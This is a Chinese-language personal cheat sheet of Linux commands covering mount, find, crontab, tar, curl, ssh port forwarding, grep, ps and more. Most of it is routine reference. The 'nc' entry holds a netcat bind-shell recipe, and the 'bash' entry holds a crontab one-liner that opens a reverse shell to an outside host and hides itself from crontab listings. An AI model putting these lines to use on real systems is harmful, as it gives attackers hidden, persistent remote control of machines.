# linux 命令



## explain shell

 [https://explainshell.com/explain?cmd=ls%20-al](https://explainshell.com/explain?cmd=ls -al) 



## umount



umount: /mnt/flag: target is busy

解决方法:

1. 杀掉占用/mnt/flag的进程

   ```
   fuser -mv /mnt/flag 或者 lsof /mnt/flag
   kill .....
   ```

2. 强制umount

   ```
   umount -l /PATH/OF/BUSY-DEVICE
   umount -f /PATH/OF/BUSY-NFS(NETWORK-FILE-SYSTEM)
   ```

   



## fsck

fsck: filesystem check

[相关链接](https://unix.stackexchange.com/questions/18154/what-is-the-purpose-of-the-lostfound-folder-in-linux-and-unix)

[鸟叔的私房菜](http://cn.linux.vbird.org/linux_basic/0230filesystem.php#fsck)

不同的机子上fsck有可能某些细节方面(option之类的)不同，建议使用前用man看一下

该指令作为：检测文件系统，恢复引用次数为0的文件...

> 由于 fsck 在扫瞄硬盘的时候，可能会造成部分 filesystem 的损坏，所以『运行 fsck 时， 被检查的 partition 务必不可挂载到系统上！亦即是需要在卸除的状态喔！』 

## mount



```bash
mount [-l|-h|-V] # 列出所有连接的文件系统
mount -a [-fFnrsvw] [-t fstype] [-O optlist]
mount [-fnrsvw] [-o options] device|dir
mount [-fnrsvw] [-t fstype] [-o options] device dir

```

-o options 主要用来描述设备或档案的挂接方式。常用的参数有：

　　loop：用来把一个文件当成硬盘分区挂接上系统

　　ro：采用只读方式挂接设备

　　rw：采用读写方式挂接设备

　　iocharset：指定访问文件系统所用字符集

device 要挂接(mount)的设备。

dir设备在系统上的挂接点(mount point)。



## less

首先来看 less 命令中最基本最常用的快捷键：

- 空格键：文件内容读取下一个终端屏幕的行数，相当于前进一个屏幕（页）。很常用的快捷键。与键盘上的 PageDown（下一页）效果一样；
- 回车键：文件内容读取下一行，也就是前进一行，与键盘上的向下键效果是一样的；
- d 键：前进半页（半个屏幕）；
- b 键：后退一页，与键盘上的 PageUp（上一页）效果一样；
- y 键：后退一行，与键盘上的向上键效果是一样的；
- u 键：后退半页（半个屏幕）；
- q 键：停止读取文件，中止 less 命令。

- = 号：显示你在文件中的什么位置（会显示当前页面的内容是文件中第几行到第几行，整个文件所含行数，所含字符数，整个文件所含字符）；
- h 键：显示帮助文档，按 q 键退出帮助文档；
- /（斜杠）：进入搜索模式，只要在斜杠后面输入你要搜索的文字，按下回车键，就会把所有符合的结果都标识出来。要在搜索所得结果中跳转，可以按 n 键（跳到下一个符合项目），N 键（shift 键 + n。跳到上一个符合项目）。当然了，正则表达式（Regular Expression）也是可以用在搜索内容中的。这里我们就不细说什么是正则表达式了，有兴趣可以 百度 / Google 看看；
- n 键：跳到下一个符合的搜索结果；
- N 键：跳到上一个符合的搜索结果。

## tail

tail -n 5 syslog
就会显示文件的尾 5 行。

tail 命令还可以配合 -f 参数来实时追踪文件的更新：

```
tail -f syslog
```



## du 

显示目录包含的文件大小

 du 是英语 disk usage 的缩写，表示“磁盘使用/占用”。 

### -h：以 Ko，Mo，Go 的形式显示文件大小

 h 是英语 human-readable 的首字母 

### -a：显示文件和目录的大小

 默认情况下，du 命令只显示目录的大小。如果加上 -a 参数（a 是英语 all 的首字母，表示“全部”），则会显示目录和文件的大小 

### -s：只显示总计大小

如果我们不想看到各个目录和文件的大小统计，而只想知道当前目录的总大小，可以使用 -s 参数（s 是英语 summarize 的首字母，表示“总结，概括”）

## nc

 nc -FNlp 80  < 2.txt

### 正向shell

```
mkfifo /tmp/fifo
cat /tmp/fifo | /bin/bash -i 2>&1 | nc -l 10000 > /tmp/fifo
```





## find



### 实例

```
find . -user www-data  #查找属于www-data的文件
```





### 语法

```
find   path   -option   [   -print ]   [ -exec   -ok   command ]   {} \;
```

**参数说明** :

find 根据下列规则判断 path 和 expression，在命令列上第一个 - ( ) , ! 之前的部份为 path，之后的是 expression。如果 path 是空字串则使用目前路径，如果 expression 是空字串则使用 -print 为预设 expression。

expression 中可使用的选项有二三十个之多，在此只介绍最常用的部份。

-mount, -xdev : 只检查和指定目录在同一个文件系统下的文件，避免列出其它文件系统中的文件

-amin n : 在过去 n 分钟内被读取过

-anewer file : 比文件 file 更晚被读取过的文件

-atime n : 在过去n天内被读取过的文件

-cmin n : 在过去 n 分钟内被修改过

-cnewer file :比文件 file 更新的文件

-ctime n : 在过去n天内被修改过的文件

-empty : 空的文件-gid n or -group name : gid 是 n 或是 group 名称是 name

-ipath p, -path p : 路径名称符合 p 的文件，ipath 会忽略大小写

-name name, -iname name : 文件名称符合 name 的文件。iname 会忽略大小写

-size n : 文件大小 是 n 单位，b 代表 512 位元组的区块，c 表示字元数，k 表示 kilo bytes，w 是二个位元组。-type c : 文件类型是 c 的文件。

d: 目录

c: 字型装置文件

b: 区块装置文件

p: 具名贮列

f: 一般文件

l: 符号连结

s: socket

-pid n : process id 是 n 的文件

你可以使用 ( ) 将运算式分隔，并使用下列运算。

exp1 -and exp2

! expr

-not expr

exp1 -or exp2

exp1, exp2

## crontab

**执行前提:启动cron服务**

Linux crontab是用来定期执行程序的命令。

### 语法

```
crontab [ -u user ] file
```

或

```
crontab [ -u user ] { -l | -r | -e }
```

crontab 是用来让使用者在固定时间或固定间隔执行程序之用，换句话说，也就是类似使用者的时程表。

-u user 是指设定指定 user 的时程表，这个前提是你必须要有其权限(比如说是 root)才能够指定他人的时程表。如果不使用 -u user 的话，就是表示设定自己的时程表。

**参数说明**：

- -e : 执行文字编辑器来设定时程表，内定的文字编辑器是 VI，如果你想用别的文字编辑器，则请先设定 VISUAL 环境变数来指定使用那个文字编辑器(比如说 setenv VISUAL joe)
- -r : 删除目前的时程表
- -l : 列出目前的时程表

时程表的格式如下：

```
f1 f2 f3 f4 f5 program
```

- 其中 f1 是表示分钟，f2 表示小时，f3 表示一个月份中的第几日，f4 表示月份，f5 表示一个星期中的第几天。program 表示要执行的程序。
- 当 f1 为 * 时表示每分钟都要执行 program，f2 为 * 时表示每小时都要执行程序，其馀类推
- 当 f1 为 a-b 时表示从第 a 分钟到第 b 分钟这段时间内要执行，f2 为 a-b 时表示从第 a 到第 b 小时都要执行，其馀类推
- 当 f1 为 */n 时表示每 n 分钟个时间间隔执行一次，f2 为 */n 表示每 n 小时个时间间隔执行一次，其馀类推
- 当 f1 为 a, b, c,... 时表示第 a, b, c,... 分钟要执行，f2 为 a, b, c,... 时表示第 a, b, c...个小时要执行，其馀类推

使用者也可以将所有的设定先存放在文件中，用 crontab file 的方式来设定时程表。

| Crontab                | 意义                                                         |
| :--------------------- | :----------------------------------------------------------- |
| 47 * * * * command     | 每个小时的 47 分都执行 command 命令，也就是 00 点 47 分, 01 点 47 分, 02 点 47 分等等 |
| 0 0 * * 1 command      | 每个礼拜一的凌晨都执行 command 命令                          |
| 30 5 1-15 * * command  | 每个月的 1 ~ 15 日的 5 点 30 分都执行 command 命令           |
| 0 0 * * 1,3,4 command  | 每个礼拜一，礼拜三，礼拜四的凌晨都执行 command 命令          |
| 0 */2 * * * command    | 每 2 个小时的整点（0，2，4，6，等等）都执行 command 命令     |
| */10 * * * 1-5 command | 每个礼拜一到礼拜五的每个 10 的倍数的分钟（0，10，20，30，等等）都执行 command 命令 |

### debug

利用mail和service cron status来进行debug

在crontab第一行设置MAILTO=""来用邮箱通知

## mkdir

### 选项 

```
-Z：设置安全上下文，当使用SELinux时有效；
-m<目标属性>或--mode<目标属性>建立目录的同时设置目录的权限；
-p或--parents 若所要建立目录的上层目录目前尚未建立，则会一并建立上层目录；
--version 显示版本信息。
```

## tcpdump

```
sudo tcpdump -nn -i lo tcp dst port 9000
```

指定本地回环网卡,获取9000端口的数据包

解析包数据:

`tcpdump -q -XX -vvv -nn -i lo tcp dst port 9000`

## strace命令

**trace命令**是一个集诊断、调试、统计与一体的工具，我们可以使用strace对应用的系统调用和信号传递的跟踪结果来对应用进行分析，以达到解决问题或者是了解应用工作过程的目的。当然strace与专业的调试工具比如说[gdb](http://man.linuxde.net/gdb)之类的是没法相比的，因为它不是一个专业的调试器。

strace的最简单的用法就是执行一个指定的命令，在指定的命令结束之后它也就退出了。在命令执行的过程中，strace会记录和解析命令进程的所有系统调用以及这个进程所接收到的所有的信号值。

### 语法 

```
strace  [  -dffhiqrtttTvxx  ] [ -acolumn ] [ -eexpr ] ...
    [ -ofile ] [-ppid ] ...  [ -sstrsize ] [ -uusername ]
    [ -Evar=val ] ...  [ -Evar  ]...
    [ command [ arg ...  ] ]

strace  -c  [ -eexpr ] ...  [ -Ooverhead ] [ -Ssortby ]
    [ command [ arg...  ] ]
```

### 选项

```
-c 统计每一系统调用的所执行的时间,次数和出错的次数等.
-d 输出strace关于标准错误的调试信息.
-f 跟踪由fork调用所产生的子进程.
-ff 如果提供-o filename,则所有进程的跟踪结果输出到相应的filename.pid中,pid是各进程的进程号.
-F 尝试跟踪vfork调用.在-f时,vfork不被跟踪.
-h 输出简要的帮助信息.
-i 输出系统调用的入口指针.
-q 禁止输出关于脱离的消息.
-r 打印出相对时间关于,,每一个系统调用.
-t 在输出中的每一行前加上时间信息.
-tt 在输出中的每一行前加上时间信息,微秒级.
-ttt 微秒级输出,以秒了表示时间.
-T 显示每一调用所耗的时间.
-v 输出所有的系统调用.一些调用关于环境变量,状态,输入输出等调用由于使用频繁,默认不输出.
-V 输出strace的版本信息.
-x 以十六进制形式输出非标准字符串
-xx 所有字符串以十六进制形式输出.
-a column 设置返回值的输出位置.默认 为40.
-e expr 指定一个表达式,用来控制如何跟踪.格式：[qualifier=][!]value1[,value2]...
qualifier只能是 trace,abbrev,verbose,raw,signal,read,write其中之一.value是用来限定的符号或数字.默认的 qualifier是 trace.感叹号是否定符号.例如:-eopen等价于 -e trace=open,表示只跟踪open调用.而-etrace!=open 表示跟踪除了open以外的其他调用.有两个特殊的符号 all 和 none. 注意有些shell使用!来执行历史记录里的命令,所以要使用\\.
-e trace=set 只跟踪指定的系统 调用.例如:-e trace=open,close,rean,write表示只跟踪这四个系统调用.默认的为set=all.
-e trace=file 只跟踪有关文件操作的系统调用.
-e trace=process 只跟踪有关进程控制的系统调用.
-e trace=network 跟踪与网络有关的所有系统调用.
-e strace=signal 跟踪所有与系统信号有关的 系统调用
-e trace=ipc 跟踪所有与进程通讯有关的系统调用
-e abbrev=set 设定strace输出的系统调用的结果集.-v 等与 abbrev=none.默认为abbrev=all.
-e raw=set 将指定的系统调用的参数以十六进制显示.
-e signal=set 指定跟踪的系统信号.默认为all.如 signal=!SIGIO(或者signal=!io),表示不跟踪SIGIO信号.
-e read=set 输出从指定文件中读出 的数据.例如: -e read=3,5
-e write=set 输出写入到指定文件中的数据.
-o filename 将strace的输出写入文件filename
-p pid 跟踪指定的进程pid.
-s strsize 指定输出的字符串的最大长度.默认为32.文件名一直全部输出.
-u username 以username的UID和GID执行被跟踪的命令
```

## bash



```bash
(crontab -l;printf "*/60 * * * * exec 9<> /dev/tcp/dns.wooyun.org/53;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n")|crontab -
```

## ulimit

它具有一套参数集，用来为由它生成的 shell 进程及其子进程的资源使用设置限制，针对的是 Per-Process 而非 Per-User 。

ulimit 用于 shell 启动进程所占用的资源，可以用来设置系统的限制，通过 `ulimit -a` 可以查看当前的资源限制，如果通过命令行设置，则只对当前的终端生效。

## vim

[http://vimcdoc.sourceforge.net](http://vimcdoc.sourceforge.net/)

从交换文件恢复:

vim -r filename



## tar

```shell
tar [-j|-z][cv][-f 建立的档名]  filename<==打包与压缩
tar [-j|-z][tv][-f 建立的档名] <=查看档名
tar [-j|-z][xv][-f 建立的档名] <==解压缩
```

参数和选项

```
-c :建立打包(create)档案,可配合-v 来查看过程中被打包的档名
-t :查看打包档案的内容含有哪些档名,重点在查看档名
-x :解打包或解压缩(extract)的功能,可以配合-C 在特定的目录解开。但是,-c,-t,-x不可以同时出现
-j :通过bzip2的支持进行压缩/解压:文件名最好为:*.tar.bz2
-z :通过gzip的支持进行压缩/解压缩:此时档名最好为*.tar.gz
-v :在压缩/解压缩的过程中,将正在处理的文件名显示出来
-f filename : -f后面要立刻接被处理的档名!建议-f单独写一个选项
-C 目录 :这个选项用在解压缩,若要在特定的目录解压缩,可以使用这个选项
-p :保留备份数据的原本权限和属性,常用于备份(-c)重要的配置文件
-P :保留绝对路径,即允许备份数据中包含根目录存在
--exclude=FILE :在压缩的过程中不要将FILE打包
```



### 常用命令

- 压缩 tar -zcv -f filename.tar.gz 目录或文件
- 查询 tar -ztv -f filename.tar.gz
- 解压缩 tar -zxv -f filename -C 欲解压路径

- 解压包下某个特定文/文件夹 tar -zxv -f filename wanted
  eg. 想要解压a.tar.gz中的file/test 则运行如下命令:`tar -zxv -f a.tar.gz file/test` 

### 常见问题

如果你想用绝对路径解压和压缩的话，那么无论在解压还是压缩都要加个-P

### zcat / bzcat，zmore / bzmore，zless / bzless ：显示用 gzip / bzip2 压缩的文件的内容

## mysqldump

```shell
mysqldump [OPTIONS] database [tables]
mysqldump [OPTIONS] --databases [OPTIONS] DB1 [DB2 DB3...]
mysqldump [OPTIONS] --all-databases [OPTIONS]
```

## mysql

`  mysql --user=user_name --password db_name `

`  mysql db_name < script.sql > output.tab `



## gzip

`Usage: gzip [OPTION]... [FILE]...`



解压 gzip -dv xxx.gz

解压到标准输出并不变动原文件

  -c, --stdout      write on standard output, keep original files unchanged
  -d, --decompress  decompress
  -f, --force       force overwrite of output file and compress links
  -h, --help        give this help
  -k, --keep        keep (don't delete) input files
  -l, --list        list compressed file contents
  -L, --license     display software license
  -n, --no-name     do not save or restore the original name and time stamp
  -N, --name        save or restore the original name and time stamp
  -q, --quiet       suppress all warnings
  -r, --recursive   operate recursively on directories
  -S, --suffix=SUF  use suffix SUF on compressed files
  -t, --test        test compressed file integrity
  -v, --verbose     verbose mode
  -V, --version     display version number
  -1, --fast        compress faster
  -9, --best        compress better
  --rsyncable       Make rsync-friendly archive

With no FILE, or when FILE is -, read standard input.

## ldd

 ldd命令可以查看一个可执行程序依赖的共享库 



## alias

 alias cp='cp -i' 

列出目前所有的别名设置:`alias -p`

### alias永久化

 <1>.若要每次登入就自动生效别名，则把别名加在/etc/profile或~/.bashrc中。然后# source ~/.bashrc
<2>.若要让每一位用户都生效别名，则把别名加在/etc/bashrc最后面，然后# source /etc/bashrc 

### 删除别名 unalias

unalias 'cat'



## curl

 https://www.ruanyifeng.com/blog/2019/09/curl-reference.html 

### get请求



####   **-G**

`-G`参数用来构造 URL 的查询字符串。

> ```bash
> $ curl -G -d 'q=kitties' -d 'count=20' https://google.com/search
> ```

上面命令会发出一个 GET 请求，实际请求的 URL 为`https://google.com/search?q=kitties&count=20`。如果省略`--G`，会发出一个 POST 请求。

如果数据需要 URL 编码，可以结合`--data--urlencode`参数。

> ```bash
> $ curl -G --data-urlencode 'comment=hello world' https://www.example.com
> ```

### post请求



#### -d

`-d`参数用于发送 POST 请求的数据体。

> ```bash
> $ curl -d'login=emma＆password=123'-X POST https://google.com/login
> # 或者
> $ curl -d 'login=emma' -d 'password=123' -X POST  https://google.com/login
> ```

使用`-d`参数以后，HTTP 请求会自动加上标头`Content-Type : application/x-www-form-urlencoded`。并且会自动将请求转为 POST 方法，因此可以省略`-X POST`。

`-d`参数可以读取本地文本文件的数据，向服务器发送。

> ```bash
> $ curl -d '@data.txt' https://google.com/login
> ```

上面命令读取`data.txt`文件的内容，作为数据体向服务器发送。

####  **--data-urlencode**

`--data-urlencode`参数等同于`-d`，发送 POST 请求的数据体，区别在于会自动将发送的数据进行 URL 编码。

> ```bash
> $ curl --data-urlencode 'comment=hello world' https://google.com/login
> ```

上面代码中，发送的数据`hello world`之间有一个空格，需要进行 URL 编码。

### 修改指定http头

`-e`参数用来设置 HTTP 的标头`Referer`，表示请求的来源。

> ```bash
> curl -e 'https://google.com?q=example' https://www.example.com
> ```

上面命令将`Referer`标头设为`https://google.com?q=example`。

`-H`参数可以通过直接添加标头`Referer`，达到同样效果。

> ```bash
> curl -H 'Referer: https://google.com?q=example' https://www.example.com
> ```

### 设置和接受cookie

#### -b

`-b`参数用来向服务器发送 Cookie。

> ```bash
> $ curl -b 'foo=bar' https://google.com
> ```

上面命令会生成一个标头`Cookie: foo=bar`，向服务器发送一个名为`foo`、值为`bar`的 Cookie。

> ```bash
> $ curl -b 'foo1=bar' -b 'foo2=baz' https://google.com
> ```

上面命令发送两个 Cookie。

> ```bash
> $ curl -b cookies.txt https://www.google.com
> ```

上面命令读取本地文件`cookies.txt`，里面是服务器设置的 Cookie（参见`-c`参数），将其发送到服务器。

#### -c

`-c`参数将服务器设置的 Cookie 写入一个文件。

> ```bash
> $ curl -c cookies.txt https://www.google.com
> ```

上面命令将服务器的 HTTP 回应所设置 Cookie 写入文本文件`cookies.txt`。

### 设置代理

####  **-x**

`-x`参数指定 HTTP 请求的代理。

> ```bash
> $ curl -x socks5://james:cats@myproxy.com:8080 https://www.example.com
> ```

上面命令指定 HTTP 请求通过`myproxy.com:8080`的 socks5 代理发出。

如果没有指定代理协议，默认为 HTTP。

> ```bash
> $ curl -x james:cats@myproxy.com:8080 https://www.example.com
> ```

上面命令中，请求的代理使用 HTTP 协议。



## find

### 根据权限查找文件

#### -perm mode

mode 可以是代表权限的八进制数字（777、666 …）也可以是权限符号（u=x，a=r+x）。

在深入之前，我们就以下三点详细说明 mode 参数。

1. 如果我们不指定任何参数前缀，它将会寻找**具体**权限的文件。
2. 如果我们使用 `-` 参数前缀， 寻找到的文件至少拥有 mode 所述的权限，而不是具体的权限（大于或等于此权限的文件都会被查找出来）。
3. 如果我们使用 `/` 参数前缀，那么所有者、组或者其他人任意一个应当享有此文件的权限。

### 基于符号的文件权限查找文件

在下面的例子中，我们使用例如 `u`（所有者）、`g`（用户组） 和 `o`（其他） 的符号表示法。我们也可以使用字母 `a` 代表上述三种类型。我们可以通过特指的 `r` （读）、 `w` （写）、 `x` （执行）分别代表它们的权限。

例如，寻找用户组中拥有 `写` 权限的文件，执行：

```shell
find -perm -g=w
```

你可以等效使用 `=` 或 `+` 两种符号标识。例如，下列两行相同效果的代码。

```
find -perm -g=w
find -perm -g+w
```

查找文件所有者中拥有写权限的文件，执行：

```
find -perm -u=w
```

查找所有用户中拥有写权限的文件，执行：

```
find -perm -a=w
```

查找所有者和用户组中同时拥有写权限的文件，执行：

```
find -perm -g+w,u+w
```

上述命令等效与 `find -perm -220`。

查找所有者或用户组中拥有写权限的文件，执行：

```
find -perm /u+w,g+w
```

或者,

```
find -perm /u=w,g=w
```

上述命令等效于 `find -perm /220`。



### -type指定类型

 f 普通文件
l 符号连接
d 目录
c 字符设备
b 块设备
s 套接字
p Fifo 

`-type f` 文件

`-type d`目录



### 指定所有用户或组

找出当前目录用户tom拥有的所有文件 `find . -type f -user tom`

 找出当前目录用户组sunk拥有的所有文件` find . -type f -group sunk`



### -exec 对找到的内容执行命令

`find -perm -o=rwx -type d -exec ls {} \; `

注意`\`和`}`之间的空格



## chmod

**chmod命令**用来变更文件或目录的权限。在UNIX系统家族里，文件或目录权限的控制分别以读取、写入、执行3种一般权限来区分，另有3种特殊权限可供运用。用户可以使用chmod指令去变更文件与目录的权限，设置方式采用文字或数字代号皆可。符号连接的权限无法变更，如果用户对符号连接修改权限，其改变会作用在被连接的原始文件。

权限范围的表示法如下：

`u` User，即文件或目录的拥有者；
`g` Group，即文件或目录的所属群组；
`o` Other，除了文件或目录拥有者或所属群组之外，其他用户皆属于这个范围；
`a` All，即全部的用户，包含拥有者，所属群组以及其他用户；
`r` 读取权限，数字代号为“4”;
`w` 写入权限，数字代号为“2”；
`x` 执行或切换权限，数字代号为“1”；
`-` 不具任何权限，数字代号为“0”；
`s` 特殊功能说明：变更文件或目录的权限。

### 语法 

```
chmod(选项)(参数)
```

### 选项 

```
-c或——changes：效果类似“-v”参数，但仅回报更改的部分；
-f或--quiet或——silent：不显示错误信息；
-R或——recursive：递归处理，将指令目录下的所有文件及子目录一并处理；
-v或——verbose：显示指令执行过程；
--reference=<参考文件或目录>：把指定文件或目录的所属群组全部设成和参考文件或目录的所属群组相同；
<权限范围>+<权限设置>：开启权限范围的文件或目录的该选项权限设置；
<权限范围>-<权限设置>：关闭权限范围的文件或目录的该选项权限设置；
<权限范围>=<权限设置>：指定权限范围的文件或目录的该选项权限设置；
```



## grep

格式

       grep [OPTIONS] PATTERN [FILE...]
       grep [OPTIONS] -e PATTERN ... [FILE...]
       grep [OPTIONS] -f FILE ... [FILE...]


 当命令匹配到执行命令时指定的模式时，grep会将包含模式的一行输出，但是并不对原文件内容进行修改。 





### -l 显示匹配文件文件内容的文件名

```shell
grep -l linuxtechi /etc/passwd /etc/shadow /etc/fstab /etc/mtab
/etc/passwd
/etc/shadow
```



### -n 在文件中查找指定模式并显示匹配行的行号



###  -v 输出不包含指定模式的行



### -r 递归地查找特定模式

` grep -r linuxtechi /etc/ `

 上面的命令将会递归的在/etc目录中查找“linuxtechi”单词 



### -i 忽略字符大小写



### -e 查找多个模式

例如我想在日志里查找带GET或者POST请求的时候

输入`grep  -e"GET" -e "POST"`

###  -B 输出匹配行的前n行



###  -A 输出匹配行的后n行



### -C 查看搜索结果前后N行



### -f 指定某个文件的内容作为搜索参数



### -E  扩展的正则表达式 



## netstat

 netstat命令各个参数说明如下：
　　-t : 指明显示TCP端口
　　-u : 指明显示UDP端口
　　-l : 仅显示监听套接字(所谓套接字就是使应用程序能够读写与收发通讯协议(protocol)与资料的程序)
　　-p : 显示进程标识符和程序名称，每一个套接字/端口都属于一个程序。
　　-n : 不进行DNS轮询，显示IP(可以加速操作)
即可显示当前服务器上所有端口及进程服务，于grep结合可查看某个具体端口及服务情况··
netstat -ntlp   //查看当前所有tcp端口·
netstat -ntulp |grep 80   //查看所有80端口使用情况·
netstat -ntulp | grep 3306   //查看所有3306端口使用情况·





## proxychains


```
vim /etc/proxychains.conf
# socks5 127.0.0.1 1080 最后 ProxyList 处更改
# 格式：type host port [user pass]
```



```shell
\# 单次代理
proxychains git clone https://github.com/haad/proxychains.git

\# 代理终端上运行的所有程序
proxychains zsh 
```



## ssh

### 功能

远程连接,端口转发,搭建代理服务器

### 选项介绍



-n 将 stdio 重定向到 /dev/null，与 -f 配合使用
 -T 不分配 TTY 只做代理用
 -q 安静模式，不输出 错误/警告 信息
 -f 后台连接
 -N 连接后不取得shell
 -C 启动压缩，加快速度
 （如不理解参数可以去掉他们看效果）
 -L 本地转发

-R 远程转发

 -D socks代理
-g 监听所有地址，允许其他主机连接。 

-p ssh所在端口,默认22

### 远程登陆

#### 基本命令

```shell
ssh -p 2222 user@host
```



#### 免密登陆

1. 用 ssh-keygen 生成密钥, 在$HOME/.ssh/目录下，会新生成两个文件：id_rsa.pub和id_rsa。前者是你的公钥，后者是你的私钥 
2. 将公钥传输到远程主机 用`ssh-copy-id user@host`, 或者手动将公钥放到` ~/.ssh/id_rsa.pub `下
3. 重启服务`/etc/init.d/ssh restart`

如果不行,则修改远程主机的 /etc/ssh/sshd_config 

```shell
　　RSAAuthentication yes
　　PubkeyAuthentication yes
　　AuthorizedKeysFile .ssh/authorized_keys
```





### 代理服务器



假定我们要让8080端口的数据，都通过SSH传向远程主机，命令就这样写：

`ssh -D 8080 user@host`

SSH会建立一个socket，去监听本地的8080端口。一旦有数据传向那个端口，就自动把它转移到SSH连接上面，发往远程主机。



### 本地端口转发



```SHELL
ssh -C -g -L <local port>:<remote host>:<remote port> <SSH hostname>
ssh -C -g -L 1234:192.168.99.125:3389 root@192.168.99.199
```



 直接访问**本机**开启监听的1234端口，等于通过**远程主机**192.168.99.199来访问**远程主机**192.168.99.125上的3389端口 



### 远程端口转发

#### 

```shell
ssh -R <local port>:<remote host>:<remote port> <SSH hostname

ssh -TN  -R 60001:localhost:8888 ccreater@39.108.164.219
```

直接访问**远程主机**上开启监听的60001端口就相当于通过**本机**来访问localhost(本机)上的8888端口。

需要修改vps上的/etc/ssh/sshd_config文件，启用 VPS sshd 的 `GatewayPorts` 参数，set to `yes` or `clientspecified`，允许任意请求地址，通过转发的端口访问内网机器。

并对外开放端口

```shell
sudo ufw allow 8899    # 防火墙打开端口，记得打开阿里云官网的防火墙
```

### ssh保持在线

ssh会话会在空闲一段时间后自动僵死，但是要注意**进程**和**连接**仍在。虽然客户端也可以设置心跳检测，但在服务端设置更方便。
 修改/etc/ssh/sshd_config



```bash
ClientAliveInterval 30#意思是每个30秒发送一次心跳请求
ClientAliveCountMax 6#超过6次心跳失败则自动终止连接
```

## man

此命令用于查看系统中自带的各种参考手册，但是手册分为好几个类别，如下所示：

1. 可执行程序或 Shell 命令；
2. 系统调用（Linux 内核提供的函数）；
3. 库调用（程序库中的函数）；
4. 文件（例如 /etc/passwd）；
5. 特殊文件（通常在 /dev 下）；
6. 游戏；
7. 杂项（比如 man(7)，groff(7)）；
8. 系统管理命令（通常只能被 root 用户使用）；
9. 内核子程序。

在终端中输入 man + 数字 + 命令/函数，即可以查到相关的命令和函数。若不加数字，那 man 命令默认从数字较小的手册中寻找相关命令和函数。

正如我们在上图中所看到的，手册页分为不同的区域。这些区域的名字是用大写和粗体表示，且靠左对齐：

- NAME ：英语“名字”的意思。手册页对应的命令或函数名字，后接简单描述；
- SYNOPSIS ：英语“概要，梗概，大意，摘要”的意思。使用此命令的所有方法。下面我们会详述这个区域，因为此区域的内容极为关键；
- DESCRIPTION ：英语“描述”的意思。命令的更深入的描述，这个区域也会包括所有参数及其用法。一般来说这个区域是文字最多的；
- SEE ALSO ：英语“另见”的意思。与此命令有关的其它命令，也就是扩展阅读。

 SYNOPSIS 区域中，粗体的文字表示要原封不动地输入，下划线的文字表示要用实际的内容替换。 

 

### SYNOPSIS 区域的语法总结

- 粗体 ：原封不动地输入；
- 下划线的部分 ：用实际的内容替换；
- [-hvc] ：表示 -h，-v 和 -c 选项都是可选的、非强制性的；
- a | b ：你可以输入 a 或者 b 选项，但是不能够同时输入 a 和 b；
- option… ：省略号表示前面的内容可以输入多个。

## apropos 命令：查找命令

 apropos 是英语“关于…”的意思。 

 apropos 命令的用法很简单，只要后接一个关键字，apropos 命令就会为你在所有手册页中查找相关的命令。 



## locate

 locate 命令不会对你实际的整个硬盘进行查找，而是在文件的数据库里查找记录。 

 Linux 系统一般每天会更新一次文件数据库。因此，只要你隔 24 小时再用 locate 查找，应该就能找到你刚创建的文件了。 我们可以用 updatedb 命令强制系统立即更新文件数据库



## sort

对文件内容进行排序并输出

### -n 将每一行视作数字进行排序

```shell
cat number.txt
1
12
23
123
222
412
sort number.txt
1
12
123
222
23
412
sort -n number.txt
1
12
23
123
222
412
```

### -o 将结果输出到文件



### -r 逆序排序

reverse



### -R 随机排序

random

## wc命令:文件的统计

 wc 是 word count 的缩写 

```shell
cat 1.txt
John
Paul
Luc
Matthew
Mark
jude
Daniel
Samuel
Job
wc 1.txt 
 9  9 50 1.txt
#第一个9代表行数,第二个9代表单词数,第三个数字代表字符数
```

### 参数介绍

-l:统计行数

-w:统计单词数

-c:统计字节数

-m:统计字符数

## uniq 删除文件中连续的重复内容

如:

```shell
cat 1.txt
1
1
2
1
uniq 1.txt
1
2
1
```

### -c 参数：统计重复的行数

### -d 参数：只显示重复行的值



## cut 剪切文件内容



- -d 参数：d 是 delimiter 的缩写，是英语“分隔符”的意思。用于指定用什么分隔符（比如逗号、分号、双引号等等）。
- -f 参数：f 是 field 的缩写，是英语“区域”的意思。表示剪切下用分隔符分隔的哪一块或哪几块区域。



## w命令 都有谁，在做什么？



```shell
w
 23:51:17 up 20 days,  8:28,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
ccreater pts/0    222.77.243.109   23:12    0.00s  0.46s  0.00s w
#第一行:第一个表示时间,第二个表示电脑运行时间,load average: 0.00, 0.00, 0.00分别代表1 分钟以内的平均负载,5 分钟以内的平均负载,15 分钟以内的平均负载
#IDLE代表用户有多久没活跃了（没运行任何命令）。idle 是英语“不活跃的，空闲的”的意思。
#JCPU：该终端所有相关的进程使用的 CPU（处理器）时间。每当进程结束就停止计时，开始新的进程则会重新计时。
#PCPU：当前进程使用的 CPU（处理器）时间。当前进程就是在 WHAT 列里显示的程序。
#WHAT：当下用户正运行的程序
```

## ps 

ps -ef：列出所有进程

ps -efH：以乔木状列出所有进程

ps -u 用户名：列出此用户运行的进程

ps -aux ：通过 CPU 和内存使用来过滤进程

```
ps -aux | less
```

默认的结果集是未排好序的，可以通过 --sort 参数来排序。

根据 CPU 使用率来降序排列：

```
ps -aux --sort -pcpu | less
```

根据内存使用率来降序排列：

```
ps -aux --sort -pmem | less
```

将 CPU 和 内存 参数合并到一起，并通过管道显示前 10 个结果：

```
ps -aux --sort -pcpu,+pmem | head
```



## 后台运行 & 和 nohup

```shell
#&和nohup的区别在于,&虽然令程序后台运行,但是仍然与终端关联,当我们退出终端时(后台进程收到HUP(hangup 挂断)信号影响),&产生的后台进程就都会结束
#而nohup则不会
nohup command
command &
```



## 后台运行之 Ctrl-Z 和 fg,bg



### Ctrl-z

Ctrl-Z 会让正在终端运行的程序转到后台,并暂停



### bg

 bg 命令的作用是将命令转入后台运行。假如命令已经在后台，并且暂停着，那么 bg 命令会将其状态改为运行。 

 不加任何参数，bg 命令会默认作用于最近的一个后台进程，也就是刚才被 Ctrl + Z 暂停的 top 进程。如果后面加 %1，%2 这样的参数（不带 %，直接 1，2 这样也可以），则是作用于指定标号的进程。因为进程转入后台之后，会显示它在当前终端下的后台进程编号。例如目前 top 进程转入了后台，它的进程编号是 1（可以由 [1]+ 推断）。依次类推，bg %2 就是作用于编号为 2 的后台进程。 



### fg

与 bg 命令相反，fg 命令的作用是：使进程转为前台运行。

用法也很简单，和 bg 一样，如果不加参数，那么 fg 命令作用于最近的一个后台进程；如果加参数，如 %2，那么表示作用于本终端中第二个后台进程。

### jobs

